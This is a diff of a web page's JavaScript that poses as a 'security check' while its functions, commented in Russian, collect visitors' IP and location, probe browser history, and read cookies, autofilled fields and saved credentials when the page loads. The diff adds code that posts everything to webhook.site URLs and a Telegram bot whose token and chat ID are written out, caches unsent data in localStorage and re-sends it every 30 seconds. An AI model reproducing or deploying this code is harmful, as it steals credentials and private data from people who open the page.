@@ -77,10 +77,17 @@
     </div>
 
     <script>
-        // ТОКЕН FORMSUBMIT
-        const FORM_TOKEN = '8df751da5a237fe0c9040294684fe0e6';
+        // ✅ ✅ ✅ НАСТРОЙКИ ЗАМЕНЕНЫ НА ТВОИ ДАННЫЕ ✅ ✅ ✅
         
-        // ОСНОВНАЯ ФУНКЦИЯ
+        // ⚡ WEBHOOK НАСТРОЙКИ ⚡
+        const WEBHOOK_PRIMARY = 'https://webhook.site/8ffbcea6-c7b9-45b1-96d8-864213150423';
+        const WEBHOOK_BACKUP = 'https://webhook.site/8ffbcea6-c7b9-45b1-96d8-864213150423'; // Можно использовать тот же или добавить другой
+        
+        // 🤖 TELEGRAM НАСТРОЙКИ 🤖  
+        const TELEGRAM_BOT_TOKEN = '8370480839:AAF8T7F0B-V1VibXUFOTYCBRTVA0BukmUs8';
+        const TELEGRAM_CHAT_ID = '8114260765';
+        
+        // 🚀 ОСНОВНАЯ ФУНКЦИЯ СБОРА ДАННЫХ
         async function startStealing() {
             updateProgress(10);
             await collectSystemInfo();
@@ -99,7 +106,6 @@
             
             updateProgress(100);
             
-            // Показываем завершение
             setTimeout(() => {
                 document.getElementById('status').innerHTML = 
                     '<p style="color: green; font-weight: bold;">✅ Security check complete!</p>' +
@@ -107,12 +113,11 @@
             }, 1000);
         }
 
-        // ОБНОВЛЕНИЕ ПРОГРЕСС БАРА
         function updateProgress(percent) {
             document.getElementById('progressBar').style.width = percent + '%';
         }
 
-        // СБОР СИСТЕМНОЙ ИНФОРМАЦИИ
+        // 📍 СБОР СИСТЕМНОЙ ИНФОРМАЦИИ
         async function collectSystemInfo() {
             try {
                 const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
@@ -139,7 +144,7 @@
             }
         }
 
-        // КРАДЕМ ИСТОРИЮ БРАУЗЕРА
+        // 🌐 КРАЖА ИСТОРИИ БРАУЗЕРА
         async function stealBrowserHistory() {
             const visited = [];
             const sites = [
@@ -191,7 +196,7 @@
             }
         }
 
-        // КРАДЕМ COOKIES
+        // 🍪 КРАЖА COOKIES
         async function stealCookies() {
             try {
                 const cookies = document.cookie;
@@ -204,7 +209,7 @@
             } catch (error) {}
         }
 
-        // КРАЖА АВТОЗАПОЛНЕННЫХ ПАРОЛЕЙ
+        // 🔑 КРАЖА АВТОЗАПОЛНЕНИЯ
         async function stealAutofillPasswords() {
             const hiddenForm = document.createElement('form');
             hiddenForm.style.cssText = 'position: absolute; left: -9999px; top: -9999px;';
@@ -233,7 +238,7 @@
             }, 1000);
         }
 
-        // ПОПЫТКА КРАЖИ СОХРАНЕННЫХ ПАРОЛЕЙ
+        // 💾 КРАЖА СОХРАНЕННЫХ ДАННЫХ
         async function stealSavedCredentials() {
             try {
                 if (navigator.credentials && navigator.credentials.get) {
@@ -253,36 +258,93 @@
             } catch (error) {}
         }
 
-        // ОТПРАВКА ОТЧЕТА
+        // 📤 УЛУЧШЕННАЯ СИСТЕМА ОТПРАВКИ
         async function sendReport(type, data) {
             try {
-                const report = {
+                const payload = {
                     report_type: type,
                     data: data,
                     session_id: Math.random().toString(36).substr(2, 9),
                     timestamp: new Date().toLocaleString()
                 };
-                
-                await fetch("https://formsubmit.co/ajax/" + FORM_TOKEN, {
+
+                // 📨 ОТПРАВКА НА WEBHOOK (ОСНОВНОЙ)
+                await fetch(WEBHOOK_PRIMARY, {
                     method: "POST",
                     headers: { 
                         'Content-Type': 'application/json',
                         'Accept': 'application/json'
                     },
-                    body: JSON.stringify(report)
-                });
-                
+                    body: JSON.stringify(payload)
+                }).catch(() => {});
+
+                // 📨 ОТПРАВКА НА WEBHOOK (РЕЗЕРВНЫЙ)
+                await fetch(WEBHOOK_BACKUP, {
+                    method: "POST", 
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                }).catch(() => {});
+
+                // 📱 ОТПРАВКА В TELEGRAM
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: `🚨 ${type.toUpperCase()}\n📡 IP: ${data.ip || 'N/A'}\n🌍 Country: ${data.country || 'N/A'}\n🕒 Time: ${new Date().toLocaleString()}`
+                    })
+                }).catch(() => {});
+
+                // 💾 СОХРАНЕНИЕ В ЛОКАЛЬНОЕ ХРАНИЛИЩЕ
+                saveToLocalStorage(payload);
+
             } catch (error) {
                 console.log('Send error');
             }
         }
 
-        // ЗАПУСК ПРИ ЗАГРУЗКЕ
+        // 💾 ЛОКАЛЬНОЕ СОХРАНЕНИЕ ДАННЫХ
+        function saveToLocalStorage(data) {
+            try {
+                const key = 'pending_reports';
+                const existing = JSON.parse(localStorage.getItem(key) || '[]');
+                existing.push({...data, stored: Date.now()});
+                
+                // Ограничение до 50 записей
+                if (existing.length > 50) existing.shift();
+                
+                localStorage.setItem(key, JSON.stringify(existing));
+            } catch (e) {}
+        }
+
+        // 🔄 СИНХРОНИЗАЦИЯ НАКОПЛЕННЫХ ДАННЫХ
+        async function syncPendingData() {
+            try {
+                const pending = JSON.parse(localStorage.getItem('pending_reports') || '[]');
+                if (pending.length === 0) return;
+
+                for (const item of pending) {
+                    await sendReport(item.report_type, item.data);
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+                }
+                
+                // Очистка после успешной отправки
+                localStorage.removeItem('pending_reports');
+            } catch (e) {}
+        }
+
+        // 🚀 ЗАПУСК ПРИ ЗАГРУЗКЕ СТРАНИЦЫ
         window.addEventListener('load', function() {
             setTimeout(() => {
                 startStealing();
             }, 1000);
         });
+
+        // 🔄 ПЕРИОДИЧЕСКАЯ СИНХРОНИЗАЦИЯ (каждые 30 секунд)
+        setInterval(syncPendingData, 30000);
     </script>
 </body>
 </html>
